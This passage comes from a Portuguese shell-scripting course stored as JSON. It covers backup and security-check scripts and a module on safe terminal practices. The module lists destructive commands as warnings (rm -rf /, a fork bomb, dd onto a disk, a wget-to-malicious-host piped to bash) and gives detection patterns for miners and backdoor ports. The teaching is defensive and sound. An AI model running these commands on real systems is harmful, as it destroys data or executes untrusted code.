\" $0}'\n    \n    sleep 5\ndone\n\n# Exemplo 2: Backup de configura√ß√µes do sistema\n#!/bin/bash\n# backup_configs.sh\n\nBACKUP_DIR=\"/backup/configs_$(date +%Y%m%d)\"\nmkdir -p \"$BACKUP_DIR\"\n\necho \"Fazendo backup de configura√ß√µes do sistema...\"\n\n# Arquivos importantes de configura√ß√£o\nCONFIG_FILES=(\n    \"/etc/ssh/sshd_config\"\n    \"/etc/nginx/nginx.conf\"\n    \"/etc/mysql/my.cnf\"\n    \"/etc/fstab\"\n    \"/etc/hosts\"\n    \"/etc/resolv.conf\"\n    \"/etc/crontab\"\n    \"/etc/passwd\"\n    \"/etc/group\"\n    \"/etc/sudoers\"\n)\n\nfor file in \"${CONFIG_FILES[@]}\"; do\n    if [ -f \"$file\" ]; then\n        cp \"$file\" \"$BACKUP_DIR/\"\n        echo \"‚úÖ Backup de $file\"\n    else\n        echo \"‚ö†Ô∏è  Arquivo n√£o encontrado: $file\"\n    fi\ndone\n\n# Backup de diret√≥rios de configura√ß√£o\nCONFIG_DIRS=(\n    \"/etc/nginx/sites-available\"\n    \"/etc/ssh/\"\n    \"/etc/systemd/system/\"\n)\n\nfor dir in \"${CONFIG_DIRS[@]}\"; do\n    if [ -d \"$dir\" ]; then\n        nome=$(basename \"$dir\")\n        tar -czf \"$BACKUP_DIR/${nome}.tar.gz\" -C \"$(dirname \"$dir\")\" \"$nome\"\n        echo \"‚úÖ Backup de $dir\"\n    fi\ndone\n\n# Compactar tudo\ntar -czf \"/backup/configs_$(date +%Y%m%d).tar.gz\" -C \"/backup\" \"configs_$(date +%Y%m%d)\"\nrm -rf \"$BACKUP_DIR\"\n\necho \"Backup conclu√≠do: /backup/configs_$(date +%Y%m%d).tar.gz\"\n\n# Exemplo 3: Verificador de seguran√ßa b√°sico\n#!/bin/bash\n# verificador_seguranca.sh\n\necho \"=== VERIFICA√á√ÉO DE SEGURAN√áA B√ÅSICA ===\"\necho \"\"\n\n# 1. Verificar atualiza√ß√µes de seguran√ßa\necho \"1. ATUALIZA√á√ïES DE SEGURAN√áA:\"\nsudo apt list --upgradable 2>/dev/null | grep -i security || echo \"   Nenhuma atualiza√ß√£o de seguran√ßa pendente\"\necho \"\"\n\n# 2. Verificar portas abertas\necho \"2. PORTAS ABERTAS:\"\nss -tulpn | grep LISTEN | awk '{print \"   \" $5}' | head -10\necho \"\"\n\n# 3. Verificar usu√°rios com sudo\necho \"3. USU√ÅRIOS COM SUDO:\"\ngrep -Po '^sudo.+:\\K.*$' /etc/group\necho \"\"\n\n# 4. Verificar senhas expiradas\necho \"4. SENHAS EXPIRADAS:\"\nsudo chage -l root | grep \"Password expires\" | awk '{print \"   Root: \" $4,$5,$6,$7,$8}'\necho \"\"\n\n# 5. Verificar permiss√µes de arquivos sens√≠veis\necho \"5. PERMISS√ïES DE ARQUIVOS SENS√çVEIS:\"\nfor file in \"/etc/passwd\" \"/etc/shadow\" \"/etc/sudoers\"; do\n    perms=$(stat -c \"%A %U %G\" \"$file\" 2>/dev/null)\n    echo \"   $file: $perms\"\ndone\necho \"\"\n\necho \"Verifica√ß√£o conclu√≠da!\"\n```",
    "summary": "Neste m√≥dulo voc√™ aprendeu as habilidades essenciais de administra√ß√£o de sistemas Linux/Unix. Dominou o monitoramento de recursos (CPU, mem√≥ria, disco, processos), gerenciamento de pacotes com diferentes sistemas (APT, YUM, DNF), configura√ß√£o e diagn√≥stico de rede, administra√ß√£o de usu√°rios e grupos, e an√°lise de logs do sistema. Aprendeu a usar ferramentas como top, htop, ps, systemctl, journalctl, ip, ss, e muitas outras. Agora voc√™ est√° equipado para manter, diagnosticar e solucionar problemas em sistemas Linux, configurar servi√ßos essenciais e implementar rotinas de manuten√ß√£o autom√°tica.",
    "estimated_time_minutes": "120"
  },
  {
    "id": "module_security",
    "course_id": "shell_script_completo",
    "title": "Seguran√ßa e Boas Pr√°ticas",
    "order": "7",
    "description": "Conhe√ßa os comandos perigosos e aprenda pr√°ticas seguras para trabalhar no terminal. Desenvolva scripts robustos com tratamento de erros, logging e padr√µes de seguran√ßa que previnam acidentes e vulnerabilidades.",
    "learning_objectives": [
      "Identificar e evitar comandos potencialmente destrutivos",
      "Implementar pr√°ticas seguras no uso do terminal",
      "Criar scripts com tratamento adequado de erros",
      "Configurar logging e monitoramento de seguran√ßa",
      "Aplicar t√©cnicas de otimiza√ß√£o e efici√™ncia em scripts",
      "Desenvolver scripts robustos com valida√ß√£o de entrada",
      "Implementar medidas de seguran√ßa em scripts de administra√ß√£o"
    ],
    "key_concepts": [
      "Comandos perigosos",
      "Pr√°ticas de seguran√ßa",
      "Tratamento de erros",
      "Valida√ß√£o de entrada",
      "Logging e auditoria",
      "Otimiza√ß√£o de performance",
      "Scripts robustos",
      "Monitoramento de seguran√ßa"
    ],
    "content": "## ‚ö†Ô∏è SEGURAN√áA E BOAS PR√ÅTICAS\n\n### üö® Comandos Perigosos - Conhe√ßa o Inimigo\n\n#### üíÄ TOP 10 COMANDOS MAIS PERIGOSOS:\n\n**1. `rm -rf /` ou `rm -rf /*`**\n```bash\n# CONSEQU√äNCIA: Apaga TODO o sistema de arquivos\n# POR QUE √â PERIGOSO: Remove tudo, incluindo sistema operacional\n# PROTE√á√ÉO: Nunca execute como root sem verificar 3x\n# ALTERNATIVA SEGURA:\n$ rm -rf diretorio_especifico/\n$ # Ou use trash-cli: trash-put arquivo.txt\n```\n\n**2. `:(){ :|:& };:` (Fork Bomb)**\n```bash\n# CONSEQU√äNCIA: Cria processos infinitos at√© travar sistema\n# POR QUE √â PERIGOSO: Consome todos os recursos do sistema\n# PROTE√á√ÉO: N√£o execute comandos desconhecidos da internet\n# SE ACONTECER:\n$ killall -STOP nome_processo  # Pausa todos os processos com esse nome\n$ # Ou reinicie o sistema\n```\n\n**3. `mv /home/usuario /dev/null`**\n```bash\n# CONSEQU√äNCIA: Perda completa de dados do usu√°rio\n# POR QUE √â PERIGOSO: /dev/null descarta tudo que √© escrito\n# PROTE√á√ÉO: Sempre teste com `ls` primeiro\n# ALTERNATIVA SEGURA:\n$ mv -i origem destino  # Modo interativo\n```\n\n**4. `chmod -R 777 /`**\n```bash\n# CONSEQU√äNCIA: Remove toda seguran√ßa do sistema\n# POR QUE √â PERIGOSO: Qualquer usu√°rio pode fazer qualquer coisa\n# PROTE√á√ÉO: Use permiss√µes m√≠nimas necess√°rias\n# CORRETO:\n$ chmod 755 diretorios/\n$ chmod 644 arquivos/\n```\n\n**5. `dd if=/dev/zero of=/dev/sda`**\n```bash\n# CONSEQU√äNCIA: Destr√≥i todo o disco irreversivelmente\n# POR QUE √â PERIGOSO: Sobrescreve com zeros, imposs√≠vel recuperar\n# PROTE√á√ÉO: Verifique `of=` MUITAS vezes\n# USO CORRETO:\n$ dd if=arquivo.iso of=/dev/sdb bs=4M status=progress\n```\n\n**6. `> arquivo_importante.conf`**\n```bash\n# CONSEQU√äNCIA: Limpa conte√∫do do arquivo sem confirma√ß√£o\n# POR QUE √â PERIGOSO: Redirecionamento `>` sobrescreve arquivo\n# PROTE√á√ÉO: Use `>>` para adicionar ou fa√ßa backup primeiro\n# ALTERNATIVA:\n$ cp arquivo.conf arquivo.conf.bak\n$ echo \"novo conteudo\" > arquivo.conf\n```\n\n**7. `wget http://site-malicioso.com/script.sh | bash`**\n```bash\n# CONSEQU√äNCIA: Executa c√≥digo malicioso no sistema\n# POR QUE √â PERIGOSO: Baixa e executa c√≥digo sem verifica√ß√£o\n# PROTE√á√ÉO: Sempre inspecione scripts antes de executar\n# CORRETO:\n$ wget http://site.com/script.sh\n$ cat script.sh  # Inspecione primeiro\n$ chmod +x script.sh\n$ ./script.sh\n```\n\n**8. `curl -s http://site.com/install.sh | sudo sh`**\n```bash\n# CONSEQU√äNCIA: Instala software malicioso com privil√©gios root\n# POR QUE √â PERIGOSO: Combina download e execu√ß√£o com sudo\n# PROTE√á√ÉO: Nunca pipe diretamente para sudo\n# CORRETO:\n$ curl -O http://site.com/install.sh\n$ sudo bash -x install.sh  # -x mostra o que est√° executando\n```\n\n**9. `mkfs.ext4 /dev/sda1` (sem verificar)**\n```bash\n# CONSEQU√äNCIA: Formata parti√ß√£o, perdendo todos os dados\n# POR QUE √â PERIGOSO: Cria novo filesystem apagando tudo\n# PROTE√á√ÉO: Verifique dispositivo 3x com `lsblk` ou `fdisk -l`\n# CORRETO:\n$ lsblk  # Liste dispositivos\n$ sudo mkfs.ext4 /dev/sdb1  # Cerifique-se do dispositivo\n```\n\n**10. `kill -9 -1`**\n```bash\n# CONSEQU√äNCIA: Mata todos os processos do usu√°rio atual\n# POR QUE √â PERIGOSO: Para todos os servi√ßos e programas\n# PROTE√á√ÉO: Especifique PID exato\n# CORRETO:\n$ kill 1234  # PID espec√≠fico\n$ pkill nome_processo  # Por nome\n```\n\n### üõ°Ô∏è Pr√°ticas Seguras - Seu Escudo Digital\n\n#### üéØ REGRAS DE OURO DA SEGURAN√áA NO TERMINAL:\n\n**1. Use `-i` (interativo) para comandos destrutivos:**\n```bash\n# Adicione ao ~/.bashrc para prote√ß√£o autom√°tica\nalias rm='rm -i'\nalias cp='cp -i'\nalias mv='mv -i'\n\n# Para for√ßar sem confirma√ß√£o (quando necess√°rio)\n$ \\rm arquivo.txt  # O \\ desabilita o alias\n```\n\n**2. Teste primeiro com `echo` ou `ls`:**\n```bash\n# ANTES DE:\n$ rm -rf /tmp/arquivos/*\n\n# FA√áA:\n$ echo \"Seriam removidos:\"\n$ ls /tmp/arquivos/*\n# Verifique a lista, depois execute\n$ rm -rf /tmp/arquivos/*\n```\n\n**3. Backup antes de opera√ß√µes em massa:**\n```bash\n# ANTES de modificar muitos arquivos\n$ tar -czf backup_pre_modificacao.tar.gz diretorio/\n\n# Ou use rsync para backup r√°pido\n$ rsync -av diretorio/ diretorio.backup/\n```\n\n**4. Use caminhos absolutos em scripts cr√≠ticos:**\n```bash\n# RUIM: pode variar dependendo do diret√≥rio atual\nrm -rf ./tmp/*\n\n# BOM: caminho expl√≠cito\nrm -rf /caminho/absoluto/tmp/*\n```\n\n**5. Valide entradas de usu√°rio:**\n```bash\n#!/bin/bash\n# Validar entrada de arquivo\narquivo=\"$1\"\n\nif [[ \"$arquivo\" != /* ]]; then\n    echo \"ERRO: Use caminho absoluto\" >&2\n    exit 1\nfi\n\nif [ ! -f \"$arquivo\" ]; then\n    echo \"ERRO: Arquivo n√£o existe\" >&2\n    exit 1\nfi\n```\n\n#### üõ°Ô∏è BOAS PR√ÅTICAS DE SCRIPT:\n\n**1. Sempre valide entradas e argumentos:**\n```bash\n#!/bin/bash\n# script_seguro.sh\nset -e  # Para se qualquer comando falhar\nset -u  # Erro se usar vari√°vel n√£o definida\nset -o pipefail  # Considera erro se qualquer parte do pipe falhar\n\n# Validar n√∫mero de argumentos\nif [ $# -lt 2 ]; then\n    echo \"Uso: $0 <origem> <destino>\" >&2\n    echo \"Exemplo: $0 /backup /storage\" >&2\n    exit 1\nfi\n\norigem=\"$1\"\ndestino=\"$2\"\n\n# Validar se diret√≥rios existem\nif [ ! -d \"$origem\" ]; then\n    echo \"ERRO: Diret√≥rio origem n√£o existe: $origem\" >&2\n    exit 1\nfi\n\nif [ ! -d \"$destino\" ]; then\n    echo \"ERRO: Diret√≥rio destino n√£o existe: $destino\" >&2\n    exit 1\nfi\n```\n\n**2. Use vari√°veis locais em fun√ß√µes:**\n```bash\nminha_funcao() {\n    local var_local=\"valor\"  # S√≥ existe na fun√ß√£o\n    local contador=0\n    local -a array_local  # Array local\n    \n    # C√≥digo da fun√ß√£o\n}\n```\n\n**3. Implemente logging adequado:**\n```bash\n#!/bin/bash\n# Configura√ß√£o de log\nLOG_FILE=\"/var/log/meu_script_$(date +%Y%m%d).log\"\n\n# Redirecionar stdout e stderr para log\nexec > >(tee -a \"$LOG_FILE\") 2>&1\n\n# Fun√ß√£o de log estruturado\nlog() {\n    local nivel=$1\n    local mensagem=$2\n    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')\n    \n    case $nivel in\n        INFO)    cor=\"\\\" ;;\n        WARNING) cor=\"\\\" ;;\n        ERROR)   cor=\"\\\" ;;\n        *)       cor=\"\\\" ;;\n    esac\n    \n    echo -e \"${cor}[$timestamp] [$nivel] $mensagem\\\"\n    \n    # Tamb√©m para syslog se necess√°rio\n    logger -t \"meu_script\" \"[$nivel] $mensagem\"\n}\n\n# Uso\nlog \"INFO\" \"Iniciando script...\"\nlog \"ERROR\" \"Falha ao processar arquivo!\"\n```\n\n**4. Tratamento de sinais e limpeza:**\n```bash\n#!/bin/bash\n# tratamento_sinais.sh\n\n# Arquivos tempor√°rios que ser√£o criados\nTEMP_FILES=()\n\n# Fun√ß√£o de limpeza\ncleanup() {\n    echo \"\nExecutando limpeza...\"\n    \n    # Remover arquivos tempor√°rios\n    for file in \"${TEMP_FILES[@]}\"; do\n        if [ -f \"$file\" ]; then\n            rm -f \"$file\"\n            echo \"Removido: $file\"\n        fi\n    done\n    \n    # Outras limpezas necess√°rias\n    echo \"Limpeza conclu√≠da.\"\n    exit 0\n}\n\n# Configurar traps para sinais\ntrap cleanup EXIT          # Sa√≠da normal\ntrap cleanup INT TERM      # Ctrl+C e kill\ntrap 'echo \"Ignorando HUP\"' HUP  # Ignorar hangup\n\n# Exemplo de uso\nTEMP_FILES+=(\"/tmp/meu_temp_$$.txt\")\necho \"conteudo\" > \"/tmp/meu_temp_$$.txt\"\n\n# O script continuaria...\n# Ao sair (normalmente ou com Ctrl+C), cleanup() ser√° chamado\n```\n\n**5. Modo debug control√°vel:**\n```bash\n#!/bin/bash\n# debug_controlado.sh\n\n# Habilitar debug via vari√°vel de ambiente\nDEBUG=${DEBUG:-false}\n\nif [ \"$DEBUG\" = \"true\" ]; then\n    set -x  # Mostra cada comando antes de executar\n    PS4='+ ${BASH_SOURCE}:${LINENO}: ${FUNCNAME[0]:+${FUNCNAME[0]}(): }'\nfi\n\n# Ou via argumento\nwhile [[ $# -gt 0 ]]; do\n    case $1 in\n        -d|--debug)\n            set -x\n            shift\n            ;;\n        # outros casos...\n    esac\ndone\n```\n\n### üìä Monitoramento Seguro\n\n#### üéØ COMANDOS DE DIAGN√ìSTICO SEGUROS:\n\n**Monitorar processos suspeitos:**\n```bash\n# Verificar processos usando muita CPU\nps aux --sort=-%cpu | head -10\n\n# Verificar processos usando muita mem√≥ria\nps aux --sort=-%mem | head -10\n\n# Buscar processos suspeitos\nps aux | grep -E \"(crypto|miner|hack|backdoor)\"\n\n# Verificar processos com nomes estranhos\nps aux | awk '{print $11}' | sort | uniq -c | sort -n\n\n# Verificar processos rodando como root\nps aux | awk '$1==\"root\" {print $0}'\n```\n\n**Monitorar rede:**\n```bash\n# Conex√µes suspeitas\nnetstat -tulpn | grep -E \":(2222|4444|5555|31337)\"\n\n# Conex√µes estabelecidas para IPs externos\nss -tun | grep ESTAB | awk '{print $5}' | cut -d: -f1 | sort | uniq -c\n\n# Portas abertas n√£o usuais\nsudo lsof -i -P | grep LISTEN\n\n# Tr√°fego de rede anormal\nsudo iftop -P  # Mostra portas\nsudo nethogs   # Mostra por processo\n```\n\n**Verificar integridade do sistema:**\n```bash\n# Arquivos modificados recentemente\nfind / -type f -mtime -1 2>/dev/null | head -20\n\n# Arquivos com permiss√µes estranhas\nfind / -type f -perm /o=w 2>/dev/null  # Escrita para outros\nfind / -type f -perm /4000 2>/dev/null  # SUID\nfind / -type f -perm /2000 2>/dev/null  # SGID\n\n# Verificar crontab de todos usu√°rios\nfor user in $(cut -f1 -d: /etc/passwd); do\n    echo \"=== $user ===\"\n    crontab -u \"$user\" -l 2>/dev/null || echo \"Sem crontab\"\ndone\n```\n\n#### üõ°Ô∏è SCRIPT DE MONITORAMENTO DE SEGURAN√áA:\n\n```bash\n#!/bin/bash\n# monitor_seguranca.sh\n\nLOG_FILE=\"/var/log/seguranca_$(date +%Y%m%d).log\"\nALERTA=false\nALERTAS=\"\"\n\nlog_alerta() {\n    local msg=\"$1\"\n    echo \"[$(date '+%Y-%m-%d %H:%M:%S')] ALERTA: $msg\" | tee -a \"$LOG_FILE\"\n    ALERTA=true\n    ALERTAS+=\"$msg\n\"\n}\n\necho \"=== MONITORAMENTO DE SEGURAN√áA ===\" | tee -a \"$LOG_FILE\"\necho \"Data: $(date)\" | tee -a \"$LOG_FILE\"\necho \"\" | tee -a \"$LOG_FILE\"\n\n# 1. Verificar portas suspeitas\necho \"1. Verificando portas suspeitas...\" | tee -a \"$LOG_FILE\"\nPORTAS_SUSPEITAS=$(ss -tulpn | grep -E \":(2222|4444|5555|31337|6667|6697)\")\nif [ -n \"$PORTAS_SUSPEITAS\" ]; then\n    log_alerta \"Portas suspeitas abertas:\n$PORTAS_SUSPEITAS\"\nfi\n\n# 2. Verificar processos de mineradores\necho \"2. Verificando processos suspeitos...\" | tee -a \"$LOG_FILE\"\nPROCESSOS_SUSPEITOS=$(ps aux | grep -iE \"(minerd|miner|cpuminer|xmrig|ccminer)\" | grep -v grep)\nif [ -n \"$PROCESSOS_SUSPEITOS\" ]; then\n    log_alerta \"Processos de minerador encontrados:\n$PROCESSOS_SUSPEITOS\"\nfi\n\n# 3. Verificar arquivos SUID/SGID perigosos\necho \"3. Verificando arquivos SUID/SGID...\" | tee -a \"$LOG_FILE\"\nSUID_PERIGOSOS=$(find / -type f -perm /6000 2>/dev/null | \\\n    xargs -I {} sh -c 'file {} | grep -q \"shell script\" && echo {}')\nif [ -n \"$SUID_PERIGOSOS\" ]; then\n    log_alerta \"Scripts shell com SUID/SGID:\n$SUID_PERIGOSOS\"\nfi\n\n# 4. Verificar crontab suspeitos\necho \"4. Verificando crontab suspeitos...\" | tee -a \"$LOG_FILE\"\nfor user in $(cut -f1 -d: /etc/passwd); do\n    crontab -u \"$user\" -l 2>/dev/null | grep -q \"curl.*http\\|wget.*http\" && \\\n        log_alerta \"Crontab suspeito para usu√°rio $user\"\ndone\n\n# 5. Verificar login failures\necho \"5. Verificando falhas de login...\" | tee -a \"$LOG_FILE\"\nFALHAS_LOGIN=$(grep \"Failed password\" /var/log/auth.log 2>/dev/null | tail -5)\nif [ -n \"$FALHAS_LOGIN\" ] && [ $(echo \"$FALHAS_LOGIN\" | wc -l) -gt 10 ]; then\n    log_alerta \"Muitas falhas de login:\n$(echo \"$FALHAS_LOGIN\" | tail -3)\"\nfi\n\n# Resumo\nif [ \"$ALERTA\" = \"true\" ]; then\n    echo \"\n‚ö†Ô∏è  ALERTAS ENCONTRADAS:\n$ALERTAS\" | tee -a \"$LOG_FILE\"\n    \n    # Enviar email se configurado\n    if [ -n \"$EMAIL_ADMIN\" ]; then\n        echo -e \"Alertas de seguran√ßa:\n\n$ALERTAS\" | mail -s \"ALERTA: Monitor de seguran√ßa\" \"$EMAIL_ADMIN\"\n    fi\nelse\n    echo \"\n‚úÖ Nenhum alerta de seguran√ßa encontrado.\" | tee -a \"$LOG_FILE\"\nfi\n\necho \"\nMonitoramento conclu√≠do.\" | tee -a \"$LOG_FILE\"\n```\n\n### ‚ö° Dicas de Otimiza√ß√£o e Efici√™ncia\n\n#### üöÄ OTIMIZA√á√ÉO DE COMANDOS:\n\n**1. Evite pipes desnecess√°rios:**\n```bash\n# ‚ùå Ineficiente\ncat arquivo.txt | grep \"padr√£o\" | sort | uniq\n\n# ‚úÖ Mais eficiente\ngrep \"padr√£o\" arquivo.txt | sort -u\n\n# ‚úÖ Ainda melhor se arquivo for grande\ngrep \"padr√£o\" arquivo.txt | awk '!seen[$0]++'\n```\n\n**2. Use `awk` para m√∫ltiplas opera√ß√µes:**\n```bash\n# ‚ùå M√∫ltiplos comandos\ngrep \"sucesso\" log.txt | cut -d' ' -f2 | sort | uniq\n\n# ‚úÖ Apenas awk\nawk '/sucesso/ {print $2}' log.txt | sort -u\n\n# ‚úÖ Awk com array para evitar sort\nawk '/sucesso/ {seen[$2]++} END {for (i in seen) print i}' log.txt\n```\n\n**3. `find` com `-exec` eficiente:**\n```bash\n# ‚ùå Processa cada arquivo separadamente\nfind . -name \"*.log\" -exec grep \"ERRO\" {} \\;\n\n# ‚úÖ Processa em lote\nfind . -name \"*.log\" -exec grep -H \"ERRO\" {} +\n\n# ‚úÖ Com xargs para maior controle\nfind . -name \"*.log\" -print0 | xargs -0 grep -H \"ERRO\"\n```\n\n**4. Leitura eficiente de arquivos grandes:**\n```bash\n# ‚ùå Carrega tudo na mem√≥ria\nconteudo=$(cat arquivo_grande.txt)\n\n# ‚úÖ Processa linha por linha\nwhile IFS= read -r linha; do\n    processar \"$linha\"\ndone < \"arquivo_grande.txt\"\n\n# ‚úÖ Usando mapfile para arrays (Bash 4+)\nmapfile -t linhas < \"arquivo_grande.txt\"\nfor linha in \"${linhas[@]}\"; do\n    processar \"$linha\"\ndone\n```\n\n**5. Use `printf` em vez de `echo` para formata√ß√£o:**\n```bash\n# ‚ùå V√°rias chamadas echo\necho \"Nome: $nome\"\necho \"Idade: $idade\"\necho \"Cidade: $cidade\"\n\n# ‚úÖ Uma chamada printf\nprintf \"Nome: %s\nIdade: %s\nCidade: %s\n\" \"$nome\" \"$idade\" \"$cidade\"\n```\n\n#### üèéÔ∏è OTIMIZA√á√ÉO DE SCRIPTS:\n\n**1. Evite subshells desnecess√°rios:**\n```bash\n# ‚ùå Cria subshell\nresultado=$(comando1 | comando2)\n\n# ‚úÖ Process substitution (Bash)\nwhile read linha; do\n    processar \"$linha\"\ndone < <(comando1 | comando2)\n\n# ‚ùå Loop com backticks\nfor arquivo in `ls *.txt`; do\n    echo \"$arquivo\"\ndone\n\n# ‚úÖ Globbing nativo\nfor arquivo in *.txt; do\n    echo \"$arquivo\"\ndone\n```\n\n**2. Use arrays para m√∫ltiplos valores:**\n```bash\n# ‚ùå String com delimitadores\narquivos=\"arq1.txt arq2.txt arq3.txt\"\nfor arquivo in $arquivos; do  # Problema com espa√ßos\n    echo \"$arquivo\"\ndone\n\n# ‚úÖ Array\ndeclare -a arquivos=(\"arq1.txt\" \"arq2.txt\" \"arq 3.txt\")\nfor arquivo in \"${arquivos[@]}\"; do\n    echo \"$arquivo\"  # Preserva espa√ßos\ndone\n```\n\n**3. Cache de comandos frequentes:**\n```bash\n# Calcular uma vez e reutilizar\nDATA_INICIO=$(date)\nUSUARIO=$USER\nHOSTNAME=$(hostname)\n\n# Em vez de chamar m√∫ltiplas vezes\necho \"In√≠cio: $DATA_INICIO\"\necho \"Usu√°rio: $USUARIO\"\necho \"Host: $HOSTNAME\"\n```\n\n**4. Script otimizado para performance:**\n```bash\n#!/bin/bash\n# script_otimizado.sh\n\n# 1. Usar shell nativo, n√£o subshells\nreadonly SCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\n\n# 2. Vari√°veis constantes em mai√∫sculas\nreadonly MAX_TENTATIVAS=3\nreadonly TIMEOUT=30\n\n# 3. Fun√ß√µes para c√≥digo reutiliz√°vel\nprocessar_arquivo() {\n    local arquivo=\"$1\"\n    # Processamento otimizado\n    awk '{print $1}' \"$arquivo\" | sort -u\n}\n\n# 4. Arrays em vez de strings\ndeclare -a ARQUIVOS=()\nARQUIVOS=(\"$(find . -name '*.log' -type f)\")\n\n# 5. Processamento em lote\nfor arquivo in \"${ARQUIVOS[@]}\"; do\n    processar_arquivo \"$arquivo\" &\ndone\nwait  # Aguarda todos os processos filhos\n\n# 6. Sa√≠da eficiente\nprintf \"%s\n\" \"Processamento conclu√≠do em $(date)\"\n```\n\n### üõ°Ô∏è CHECKLIST DE SEGURAN√áA PARA SCRIPTS\n\nAntes de executar qualquer script, verifique:\n\n```bash\n#!/bin/bash\n# checklist_seguranca.sh\n\nSCRIPT=\"$1\"\n\necho \"=== CHECKLIST DE SEGURAN√áA PARA: $SCRIPT ===\"\necho \"\"\n\n# 1. Verificar permiss√µes\necho \"1. PERMISS√ïES:\"\nls -la \"$SCRIPT\"\necho \"\"\n\n# 2. Verificar shebang\necho \"2. SHEBANG:\"\nhead -1 \"$SCRIPT\"\necho \"\"\n\n# 3. Verificar se requer sudo\necho \"3. COMANDOS PRIVILEGIADOS:\"\ngrep -n \"sudo\\|su \\|chmod [0-9][0-9][0-9] /\" \"$SCRIPT\" | head -5\necho \"\"\n\n# 4. Verificar downloads da internet\necho \"4. DOWNLOADS DA INTERNET:\"\ngrep -n \"curl\\|wget\\|http://\\|https://\" \"$SCRIPT\" | head -5\necho \"\"\n\n# 5. Verificar comandos perigosos\necho \"5. COMANDOS PERIGOSOS:\"\nCOMANDOS_PERIGOSOS=\"rm -rf.*/\\|rm -rf.*\\\\*\\|dd.*of=/dev/\\|chmod -R 777\\|:().*\"\ngrep -n \"$COMANDOS_PERIGOSOS\" \"$SCRIPT\" | head -5\necho \"\"\n\n# 6. Verificar redirecionamentos\necho \"6. REDIRECIONAMENTOS PERIGOSOS:\"\ngrep -n \">[^>]\" \"$SCRIPT\" | grep -v \"^#\" | head -5\necho \"\"\n\necho \"Checklist conclu√≠do. Revise os itens acima antes de executar.\"\n```\n\n### üéØ EXEMPLO: SCRIPT SEGURO E OTIMIZADO\n\n```bash\n#!/bin/bash\n# backup_seguro.sh\n# Script de backup com todas as boas pr√°ticas\n\n# === CONFIGURA√á√ÉO ===\nset -euo pipefail  # Fail fast\nshopt -s nullglob  # Arrays vazios se nenhum match\n\n# Constantes\nreadonly SCRIPT_NAME=\"$(basename \"$0\")\"\nreadonly SCRIPT_DIR=\"$(cd \"$(dirname \"${BASH_SOURCE[0]}\")\" && pwd)\"\nreadonly BACKUP_BASE=\"/backup\"\nreadonly LOG_DIR=\"/var/log/backup\"\nreadonly RETENCAO_DIAS=30\n\n# === VALIDA√á√ÉO ===\n# Verificar se √© root (se necess√°rio)\nif [[ $EUID -eq 0 ]]; then\n    echo \"ERRO: N√£o execute como root\" >&2\n    exit 1\nfi\n\n# Verificar argumentos\nif [[ $# -lt 1 ]]; then\n    echo \"Uso: $0 <diretorio1> [diretorio2 ...]\" >&2\n    exit 1\nfi\n\n# Validar diret√≥rios de entrada\nfor dir in \"$@\"; do\n    if [[ ! -d \"$dir\" ]]; then\n        echo \"ERRO: Diret√≥rio n√£o existe: $dir\" >&2\n        exit 1\n    fi\n    \n    if [[ ! -r \"$dir\" ]]; then\n        echo \"ERRO: Sem permiss√£o de leitura: $dir\" >&2\n        exit 1\n    fi\n    \n    # Prevenir caminhos perigosos\n    if [[ \"$dir\" == \"/\" ]] || [[ \"$dir\" == \"/root\" ]]; then\n        echo \"ERRO: Backup de diret√≥rio proibido: $dir\" >&2\n        exit 1\n    fi\ndone\n\n# === INICIALIZA√á√ÉO ===\nreadonly DATA=\"$(date +%Y%m%d_%H%M%S)\"\nreadonly BACKUP_DIR=\"${BACKUP_BASE}/backup_${DATA}\"\nreadonly LOG_FILE=\"${LOG_DIR}/backup_${DATA}.log\"\n\n# Criar diret√≥rios necess√°rios\nmkdir -p \"$BACKUP_DIR\" \"$LOG_DIR\"\n\n# === FUN√á√ïES ===\nlog() {\n    local nivel=\"$1\"\n    local mensagem=\"$2\"\n    local timestamp=\"$(date '+%Y-%m-%d %H:%M:%S')\"\n    \n    printf \"[%s] [%s] %s\n\" \"$timestamp\" \"$nivel\" \"$mensagem\" | tee -a \"$LOG_FILE\"\n}\n\ncleanup() {\n    local exit_code=$?\n    \n    log \"INFO\" \"Executando limpeza...\"\n    \n    # Remover diret√≥rio de backup se vazio\n    if [[ -d \"$BACKUP_DIR\" ]] && [[ -z \"$(ls -A \"$BACKUP_DIR\")\" ]]; then\n        rmdir \"$BACKUP_DIR\"\n        log \"INFO\" \"Diret√≥rio de backup vazio removido\"\n    fi\n    \n    log \"INFO\" \"Script finalizado com c√≥digo: $exit_code\"\n    exit $exit_code\n}\n\n# Configurar traps\ntrap cleanup EXIT INT TERM\n\n# === EXECU√á√ÉO PRINCIPAL ===\nlog \"INFO\" \"Iniciando backup seguro\"\nlog \"INFO\" \"Diret√≥rios: $*\"\nlog \"INFO\" \"Destino: $BACKUP_DIR\"\n\n# Backup de cada diret√≥rio\nfor origem in \"$@\"; do\n    nome=\"$(basename \"$origem\")\"\n    destino=\"${BACKUP_DIR}/${nome}.tar.gz\"\n    \n    log \"INFO\" \"Backup: $origem -> $destino\"\n    \n    # Medir tempo\n    inicio=$(date +%s)\n    \n    # Criar backup com verifica√ß√µes\n    if tar -czf \"$destino\" -C \"$(dirname \"$origem\")\" \"$nome\" 2>/tmp/backup_error.$$; then\n        fim=$(date +%s)\n        duracao=$((fim - inicio))\n        tamanho=$(du -h \"$destino\" | cut -f1)\n        \n        log \"SUCESSO\" \"Backup criado: $destino ($tamanho, ${duracao}s)\"\n    else\n        log \"ERRO\" \"Falha no backup de $origem\"\n        log \"ERRO\" \"$(cat /tmp/backup_error.$$)\"\n        rm -f \"$destino\"  # Remover backup incompleto\n    fi\n    \n    rm -f /tmp/backup_error.$$\ndone\n\n# Limpar backups antigos\nlog \"INFO\" \"Removendo backups com mais de ${RETENCAO_DIAS} dias...\"\nfind \"$BACKUP_BASE\" -name \"backup_*\" -type d -mtime +$RETENCAO_DIAS | \\\n    while read -r dir_antigo; do\n        log \"INFO\" \"Removendo: $dir_antigo\"\n        rm -rf \"$dir_antigo\"\n    done\n\n# Verificar espa√ßo final\nespaco_livre=$(df -h \"$BACKUP_BASE\" | awk 'NR==2 {print $4}')\nlog \"INFO\" \"Backup conclu√≠do. Espa√ßo livre: $espaco_livre\"\n\n# === CONCLUS√ÉO ===\nlog \"INFO\" \"Script executado com sucesso\"\nexit 0\n```\n\n### üìã RESUMO DAS BOAS PR√ÅTICAS\n\n1. **Valide sempre as entradas** - Nunca confie em dados externos\n2. **Use `set -euo pipefail`** - Para scripts mais seguros e previs√≠veis\n3. 